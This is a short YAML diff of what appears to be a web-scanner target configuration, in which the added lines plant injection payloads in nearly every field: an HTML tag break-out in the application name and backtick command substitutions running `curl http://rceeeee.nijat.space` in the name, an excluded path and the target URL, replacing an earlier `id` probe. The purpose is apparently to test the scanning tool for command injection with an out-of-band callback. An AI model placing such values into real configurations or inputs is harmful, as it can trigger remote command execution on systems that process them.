@@ -1,6 +1,7 @@
 applications:
-- application_name: nijat.space"><h1>aaa</h1>
+- application_name: nijat.space"><h1>aaa</h1> `curl http://rceeeee.nijat.space`
   authentication_mode: non-authenticated
-  exclude_paths: []
-  target_url: https://nijat.space/`id`
+  exclude_paths:
+  - '`curl http://rceeeee.nijat.space`'
+  target_url: https://nijat.space/`curl http://rceeeee.nijat.space`
   type: web
